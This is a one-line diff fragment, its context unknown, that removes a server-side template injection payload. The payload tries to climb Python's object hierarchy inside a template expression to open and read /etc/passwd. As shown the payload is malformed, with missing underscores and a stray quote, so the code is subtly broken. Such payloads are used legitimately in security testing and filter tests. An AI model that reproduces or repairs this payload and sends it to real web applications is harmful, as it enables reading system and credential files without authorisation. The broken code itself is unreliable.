@@ -1,1 +1,0 @@
-{{".class.mro[2].subclasses()[40]('/etc/passwd').read}}
